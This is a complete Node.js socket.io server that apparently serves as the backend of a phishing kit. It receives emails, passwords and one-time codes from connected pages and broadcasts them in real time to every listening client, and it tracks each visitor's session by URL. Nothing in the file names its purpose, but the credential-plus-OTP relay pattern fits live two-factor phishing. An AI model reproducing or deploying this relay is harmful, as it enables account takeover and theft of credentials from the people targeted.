const { createServer } = require('http')
const { parse } = require('url')
const next = require('next')

const { Server } = require('socket.io');
const axios = require('axios');

const newServer = createServer()
const io = new Server(newServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

let activeUsers = [];

io.on('connection', (socket) => {
  console.log('a user connected: ' + socket.id);

  // Handle request for all users
  socket.on('get_all_user', (socketId) => {
    const user = activeUsers.find(user => user.url === socketId);
    io.emit('get_all_user', {
      status: user ? true : false,
      id: socketId
    });
  });

  // Add active user
  socket.on('add_active_user', (userID) => {
    if (!activeUsers.some(user => user.user_id === userID.myID)) {
      activeUsers.push({
        user_id: userID.myID,
        socketId: socket.id,
        url: userID.url
      });
    }
  });

  // Handle incoming data
  socket.on('data', (d) => {
    io.emit('get_data', {
      email: d.e,
      password: d.p,
      id: d.id,
      time: Date.now(),
      data_id: d.data_id,
      notify_id: d.notify_id
    });
  });

  // Handle OTP data
  socket.on('otp', (d) => {
    io.emit('get_data_otp', {
      otp: d.otp,
      id: d.id,
      time: Date.now(),
      data_id: d.data_id,
      notify_id: d.notify_id
    });
  });

  // Handle user disconnect
  socket.on('disconnect', () => {
    console.log('user disconnected: ' + socket.id);
    activeUsers = activeUsers.filter(user => user.socketId !== socket.id);
  });
});
const port = 4789
newServer.listen(port, () => {
  console.log(`> Ready on PORT : ${port}`)
});
